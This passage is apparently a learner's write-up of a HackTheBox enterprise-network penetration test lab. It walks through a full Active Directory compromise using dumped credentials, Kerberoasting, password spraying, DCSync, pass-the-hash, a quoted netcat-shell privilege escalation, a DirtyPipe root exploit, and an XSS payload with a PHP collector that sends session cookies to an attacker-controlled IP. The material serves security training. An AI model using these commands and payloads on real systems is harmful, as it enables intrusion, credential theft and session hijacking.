SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:3f91ba89035055afb5595488e66b8909
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:des-cbc-md5:94f8e3160113235d
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:plain_password_hex:1e7be7b31d2e60c85ce045e6baaaa927e69245d6227ac9126972e94778d24b61c123220104ecfd244291f7607a4160a7f0501cc2d41ea8951712f502f0c269c616777d6967480098f5daf64cffe22bbbd191dc4ae21ea7120639c62ffbff0b441c8a3f439cf74a857412595e08d05ebeab855d79811b89ebd6b735cafcce0b78ec0cf185095ab8e868455de6630b2be07489b045aee896b76e5a6eebd18d4712d285389bffe42a29168d9770ec831281d06002345ac89d3decc8f29d25864704e5b6cd4d05f1992aeca2aa02baf0b23167e2062d443fb2bb54a612bd91412054c5ea3f557376df8225b0790179fa56ec
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:7f4bdd5132d1125539db0398538eb8b3:::
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/hporter:Gr8hambino!
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
```
Where we can see hporter:Gr8hambino!

Since we now have a local administrator account on DEV01, we can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation, as well as possibly find how the hporter user credentials can be used in this AD domain. We can use Evil-WinRM to upload Sharphound.exe and create a zip file for BloodHound to enumerate the domain:
```
upload /path/to/local/file C:/Users/victim/Desktop/file.exe
./SharpHound.exe -c All
download C:/Users/victim/Desktop/file.zip /path/to/local/destination
```
We then download the zip file to our local attack box. 
If you have not downloaded BloodHound, there are steps on Github that may seem a bit complicated. I am on Ubuntu Linux, and the easiest way for me was to install Docker Desktop on my OS and have the container run on my localhost at port 8080. There, we can access our BloodHound instance and insert all of the files contained in the Sharphound zip file. For more information you can go to https://github.com/SpecterOps/BloodHound.

Now that we have BloodHound open, we see that the hporter user has RDP privileges over the DEV01 host. We also see that most likely any Domain User account can RDP into DEV01 under "Inbound Execution Privileges," which is definitely a security risk since you generally want least privilege access. 

We now try the credentials with xfreerdp:
```
proxychains xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /drive:(drivename),"/home/(drivename)"
```
After this, we can cd into the C:/share directory and run the command "net use" to make our attack box's drive accessible. Now we can copy files from our drive using the copy command:
```
C:/Share copy //TSCLIENT/home/file
```
On Outbound Execution Privileges, we see that hporter has the ForceChangePassword permission over the user ssmalls which is in the itadmins group, giving us a possible privilege escalation. We can abuse the ForceChangePassword permission with the PowerView command after copying PowerView to the DEV01 host through xfreerdp /drive:
```
Import-Module PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Password123@' -AsPlainText -Force ) -Verbose
```
We don't immediately see anything from the ssmalls user, so we can try running the Snaffler tool to enumerate any file shares that are readable from the computers in AD. 

We see that we have available shares from the domain controller:
```
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Black}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/ADMIN$>()
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/ADMIN$>(R) Remote Admin
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Black}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/C$>()
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/C$>(R) Default share
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//DC01.INLANEFREIGHT.LOCAL/Department Shares>(R) Share for department users
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//DC01.INLANEFREIGHT.LOCAL/NETLOGON>(R) Logon server share
[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//DC01.INLANEFREIGHT.LOCAL/SYSVOL>(R) Logon server share
```
We see an interesting share on the domain controller 172.16.8.3 that is accessible with our hporter account: //DC01.INLANEFREIGHT.LOCAL/Department Shares.
We then can use netexec's spider_plus module to attempt to enumerate all of the shares' contents:
```
proxychains netexec smb 172.16.8.3 -u ssmalls -p Password123@ -M spider_plus --share 'Department Shares'
Saved share-file metadata to "/home/kchen/.nxc/modules/nxc_spider_plus/172.16.8.3.json"
cat /home/kchen/.nxc/modules/nxc_spider_plus/172.16.8.3.json

{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 14:34:16",
            "ctime_epoch": "2022-06-01 14:34:16",
            "mtime_epoch": "2022-06-01 14:35:16",
            "size": "3.91 KB"
        }
    },
    "NETLOGON": {
        "adum.vbs": {
            "atime_epoch": "2022-06-01 14:34:41",
            "ctime_epoch": "2022-06-01 14:34:41",
            "mtime_epoch": "2022-06-01 14:34:39",
            "size": "32.15 KB"
        }
    },
    "SYSVOL": {
        "INLANEFREIGHT.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2022-06-01 14:17:55",
            "ctime_epoch": "2022-06-01 14:11:08",
            "mtime_epoch": "2022-06-01 14:17:55",
            "size": "22 B"
        },
        "INLANEFREIGHT.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2022-06-01 14:17:55",
            "ctime_epoch": "2022-06-01 14:11:08",
            "mtime_epoch": "2022-06-01 14:17:55",
            "size": "1.07 KB"
        },
        "INLANEFREIGHT.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2022-06-01 14:11:08",
            "ctime_epoch": "2022-06-01 14:11:08",
            "mtime_epoch": "2022-06-01 14:11:12",
            "size": "22 B"
        },
        "INLANEFREIGHT.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2022-06-01 14:11:09",
            "ctime_epoch": "2022-06-01 14:11:09",
            "mtime_epoch": "2022-06-01 14:11:12",
            "size": "3.68 KB"
        },
        "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
            "atime_epoch": "2022-06-01 14:34:41",
            "ctime_epoch": "2022-06-01 14:34:41",
            "mtime_epoch": "2022-06-01 14:34:39",
            "size": "32.15 KB"
        }
    }
}
```
We see that there is a SQL Express Backup ps1 file in the path "//DC01.INLANEFREIGHT.LOCAL/Department Shares/IT/Private/Development/SQL Express Backup.ps1"

We can then use smbclient to connect to the share with the user ssmalls:
```
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
```
Cd to the correct directory, and then:
```
smb: \IT\Private\Development\> get SQL Express Backup.ps1 
```
Here are the contents of the file:
```
$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"
```
We also see a script that may contain useful unformation in the sysvol folder INLANEFREIGHT.LOCAL/scripts/adum.vbs
```
proxychains smbclient -U ssmalls '//172.16.8.3/sysvol'
(cd to directory)
get adum.vbs
```
and we read the file:
```
cat adum.vbs

Const cdoUserName = "account@inlanefreight.local"	'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$$w0rD"			'EMAIL - PASSWORD - IF AUTHENTICATION REQUIRED
```
We get two sets of credentials. 

We now can also use PowerView to get a list of users that can be kerberoasted with the following command:
```
Get-DomainUser * -SPN |Select samaccountname
```
which gives us 
```
samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```
We then can copy the password hashes for these SPNs using PowerView to a .csv file with the following command:
```
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```
We download the file to our attack box and use LibreOffice or equivalent to open the .csv file. We copy/paste the hashes to a separate text file and run hashcat:
```
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
```
After it runs, we see that we get the password "lucky7" for the user backupjob01 and SPN veem001, however upon searching BloodHound this account does not seem to be useful.

Now we can try passwordspraying some common passwords in the domain using a powershell module like DomainPasswordSpray.ps1 
```
Invoke-DomainPasswordSpray -Password Welcome1

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2913 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2913 users. Current time is 11:47 AM
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1
[*] Password spraying is complete
```
We have two users with the Welcome1 password, but neither has interesting access. 

```
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```
We can use this command using the gpp_autologin module, which searches for Group Policy Preferences (GPP) credentials in the SYSVOL share attempting to retrieve plaintext credentials. Unfortunately this does not give us anything useful.

We also use a command to check AD for account descriptions for credentials:
```
Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}
```
but nothing useful pops up either.

We can move onto the other host we haven't touched: 172.16.8.50. We check if WinRM is enabled on this host so that we can potentially login with Evil-WinRM. The port for WinRM is 5985 so we can do an nmap scan:
```
proxychains nmap -sT -p 5985 172.16.8.50
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:80-<--timeout
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
Nmap scan report for 172.16.8.50
Host is up (0.12s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```
It is up so we can use Evil-WinRM to remote in:
```
proxychains evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```
Since WinRM uses a kerberos ticket to authenticate, we won't be able to authenticate when using certain tools due to the Kerberos double-hop problem, so we need to set up a PSCredential object using PowerView to workaround that. 

Poking around in the host we see an unattend.xml file which is used to automate and customize the Windows installation process. Upon using the type command we see the following credentials:
```
ilfserveradm
Sys26Admin
```
We can do net user ilfserveradm and we see that this is a Remote Desktop User, meaning that we can use xfreerdp with these credentials to reconnect to the host. 

```
sudo proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin /drive:/home,"/home/kchen"
```
We see that there is a program called Sysax FTP Automation with version 6.90 in Program Files x86 with the following privilege escalation exploit on exploitdb: https://www.exploit-db.com/exploits/50834

We follow these directions in the exploit and eventually get SYSTEM privilege:
```
# Details:
Sysax Scheduler Service runs as Local System. By default the application allows for low privilege users to create/run backup jobs other than themselves.  By removing the option to run as current user or another, the task will run as System.  A low privilege user could abuse this and escalate their privileges to local system.

# Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running Sysax FTP Automation using a low privileged user account

# Exploit:
Logged in as low privileged account

1. Create folder c:\temp
2. Download netcat (nc.exe) to c:\temp
3. Create file 'pwn.bat' in c:\temp with contents
	c:\temp\nc.exe localhost 1337 -e cmd
4. Open command prompt and netcat listener
	nc -nlvvp 1337
5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
6. Select Setup Scheduled/Triggered Tasks
	- Add task (Triggered)
	- Update folder to monitor to be c:\temp
	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
	- Uncheck 'Login as the following user to run task'
	- Finish and Save
7. Create new text file in c:\temp
8. Check netcat listener
	C:\WINDOWS\system32>whoami
	whoami
	nt authority\system
```
Next we can add ilfserveradm as a local administrator with the following command:
```
net localgroup administrators /add ilfserveradm
```
We can also now transfer interesting files on the machine to our attack box by using xfreerdp's TSCLIENT. We see files named budget_data.xlsx and Inlanefreight.kdbx which may be interesting so we transfer those. 

We can then import mimikatz.exe from our attack box to dump LSA secrets. 
```
.\mimikatz.exe lsadump::secrets

Secret  : DefaultPassword
cur/text: DBAilfreight1!
```
We see a secret named DefaultPassword, which is most likely a naming convention for the Windows Autologon feature. We run the following command to find the Windows Autologon DefaultUsername:
```
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
                  NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```
which gives us the username mssqladm.

We now have a new credential pair: mssqladm:DBAilfreight1!

We can also use LaZagne.exe and Responder or Inveigh to further attempt to retrieve passwords from 172.16.8.50 but we see that they come up short. 

Since we now have a new credential pair, we can look up the username in Bloodhound. We see that mssqladm has GenericWrite permissions over the user ttimmons. We now go back to the DEV01 host with the hporter domain user and we launch the following commands to create a PSCredential Object and create an SPN for the ttimmons user:
```
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons'
```
Now we can use GetUserSPNs.py to get the SPN hash from ttimmons:
```
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```
We save the hash and run hashcat:
```
hashcat -m 13100 hash.txt rockyou.txt

Repeat09
```
So we get the credential pair ttimmons:Repeat09

We check on Bloodhound for ttimmons' permissions and we see that they have the GenericAll right to the SERVER ADMINS group, meaning that ttimmons can add anyone to the SERVER ADMINS group. We also see that the SERVER ADMINS group has the GetChanges and GetChangesAll right to the domain, meaning that we can launch a DCSync attack to get credentials from the domain. 

We first add a PSCredential Object for ttimmons:
```
$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```
We then can add the user to the Server Admins group to inherit the DCSync privileges:
```
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```
Finally we can use secretsdump.py to DCSync all NTLM password hashes from the Domain Controller:
```
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdill
```
Now that we have the hash for the domain controller's local administrator account, we can use Evil-WinRM to use pass-the-hash to login. 
```
sudo proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```
Once we login, we see that we are finally domain and enterprise admin. We can now conclude this penetration test, however if we wanted to do post-exploitation to see if we can access other domains or collect as many credentials as we want, we can do so as well.

We find the final flag on the Administrator's desktop: 7c09eb1fff981654a3bb3b4a4e0d176a

### Eighteenth Flag:
We have acquired domain/enterprise admin, but there are still some flags that we missed:

In the ticketing system at support.inlanefreight.local/ticket.php, we can create a ticket and see the HTTP request in burpsuite. In the messages box, we can try using a javascript XSS attack with this code:
```
"><script src=http://10.10.16.46:9000/TESTING_THIS</script>
```
which will try to retrieve a javascript file from an external source at IP 10.10.16.46 which is our attack box. We start a netcat listener and then run the ticket creation with the script in the message box and we successfully receive a connection from the web server:
```
Connection received on 10.129.129.129 42514
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.16.46:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```
We can now setup index.php which will accept and collect cookie parameters as well as a script.js file that appends the web server's cookies to the index.php file.
index.php:
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
and
script.js
```
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
```
Then we can setup a php server:
```
sudo php -S 0.0.0.0:9200
```
and then insert the javascript code that calls our script.js file
```
"><script src=http://10.10.16.46:9200/script.js</script>
```
which gives us the cookie on our netcat listener. We can then use a browser cookie editor to insert the cookie named "session" on our browser and press the login button on the top right and we should get our eighteenth flag:
```
HTB{1nS3cuR3_c00k135}
```
### Missed one HTB question:
We also missed the NTLM hash for user mpalledorous when we were pentesting the host 172.16.8.50. When we privilege escalated to SYSTEM by using the SysaxAutomation exploit, we can run Inveigh or Responder to scan for NTLM hashes sent across the network through LLMNR. We import Inveigh.ps1 to the host through TSCLIENT and then run the following as SYSTEM privilege:
```
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```
We eventually get the following hash:
```
mpalledorous::ACADEMY-AEN-DEV:1DCA13A4F4F2A4D3:743A2E969640EE1044E92FB2300A0B64:01010000000000006518101646A8DB01E7477FC05BA2BE5B0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008006518101646A8DB01060004000200000008003000300000000000000000000000002000001C0DA9CF79A3FD3728B9B1F4FAAC47C9A2369DF7C0EDB4EB1E2091D43D9976600A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
```
We can use hashid or other 3rd party tool to see that this is a Kerberos 5, etype 23, TGS-REP, therefore we can crack it with hashcat method 13100:
```
sudo hashcat -m 13100 hash.txt rockyou.txt
```
and we get 1squints2 as the password.

### Post-Exploitation / Nineteenth Flag
Now that we have domain admin, we can think about post-exploitation to cover our tracks as well as provide additional value to a hypothetical client by enumerating sensitive file shares. An example would be removing the acme/TESTING SPN that was created on the domain as well as all of the files and folders that we created on the machines we exploited. We can show access to HR information containing payroll data, as well as R&D information. We can also attempt to enumerate more networks in the hopes of finding paths to backup servers. 

We check ifconfig /all on the domain controller and see that we are connected to the 172.16.9.0 subnet. We can run a ping sweep with the following command:
```
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```
Run this multiple times as for me it gave false negatives.

We find that 172.16.9.25 is active. Next we can check for any id_rsa keys with the following command:
```
Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*id_rsa*" }
```
We can also just browse to Department Shares and find them in one of the IT folders. 
We see an admin account id_rsa key which we can potentially use to ssh into the live host 172.16.9.25.
We can do proxychains nmap to see if the ssh port is open and it is:
```
proxychains nmap -sT -p 22 172.16.9.25 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 16:54 EDT
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  172.16.9.25:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  172.16.9.25:22  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.9.25
Host is up (14s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```
We can then use the id_rsa key to ssh in:
```
sudo proxychains ssh -i ssmalls-id_rsa ssmallsadm@172.16.9.25

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  172.16.9.25:22  ...  OK
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Apr 2025 09:05:44 PM UTC

  System load:  0.0                Processes:               229
  Usage of /:   27.4% of 13.72GB   Users logged in:         0
  Memory usage: 11%                IPv4 address for ens160: 172.16.9.25
  Swap usage:   0%


159 updates can be applied immediately.
103 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
ssmallsadm@MGMT01:~$ whoami
ssmallsadm
```
And we are able to find a flag immediately:
```
ssmallsadm@MGMT01:~$ cat flag.txt
3c4996521690cc76446894da2bf7dd8f
```
### Post-Exploitation / Twentieth / Final Flag
We run the command uname -a to see the Linux version and search on Google for a vulnerability.
We get:
Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
We use a relatively recent Github repo for this exploit: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
and we copy the code from exploit-2 which can escalate our shell to root. We copy it over to the 172.16.9.25 machine through vim editor and compile the C code with gcc. We can then enumerate SUID binaries on the system that can be exploited through thsi command:
```
find / -perm -4000 2>/dev/null
```
We see that /usr/bin/sudo is available and we run the following:
```
./exploit /usr/bin/sudo
```
and we get the root shell. With the root shell, we do ls and see the final flag.txt of this blackbox penetration test:
```
# ls
flag.txt  snap
# cat flag.txt
206c03861986c0e264438cb6e8e90a19
```
From here, we can keep trying to enumerate more networks, files, and systems to further prove impact on this penetration test. We can experiment with various ways to exfiltrate data so that the client can test their DLP Data Loss Prevention measures, as well as try our hand at attacking domain trusts to compromise intra-domain trusts and external domain trusts.

If this were a real engagement, we should be noting down:
Every scan
Attack attempt
File placed on a system
Changes made (accounts created, minor configuration changes, etc.)

Before the engagement closes, we should delete any files we uploaded (tools, shells, payloads, notes) and restore everything to the way we found it. Regardless of if we were able to clean everything up, we should still note down in our report appendices every change, file uploaded, account compromise, and host compromise, along with the methods used. We should also retain our logs and a detailed activity log for a period after the assessment ends in case the client needs to correlate any of our testing activities with some alerts. Treat the network in this module like a real-world customer network. 

This was my first black-box penetration test engagement I have ever done, and I have to admit I did a lot of googling and AI-fu. Hopefully in the next boxes I do I will not require nearly as much hand-holding from external resources. It took me almost a month to complete this single module, and despite all the Googling and AI I used there were still many times where a particular attack or tool didn't work the way it should and caused me lots of frustration in terms of trying to fix it and/or finding an alternative. This is especially true for trying to get proxychains to work, as even when I did get the proxychains tunnel to connect, the tunnel was just not reliable for browsing to internal websites due to the lag. It felt great once I got Chisel to work and experienced 0 lag on internal websites after my failure with proxychains. All in all, the Penetration Tester path on HackTheBox took a ton of work in terms of both reading material and machines to hack, even with Google-fu and ChatGPT. Getting to this point from 0 modules on the path took me approximately 4 months with an approximate daily study time of 2 hours, so you can definitely do it faster if you were dedicated and had the hours to spare. 

```
Amazing work! You have made it to the end of the Attacking Enterprise Networks module and perhaps even the end of the Penetration Tester job role path. In the process you accomplished the following:

- `Hacked around 250 Targets`
- `400+ module sections completed`
- `500+ challenge questions solved`
- `Over 750,000 words read`

Those alone are significant achievements worthy of being proud!
```


















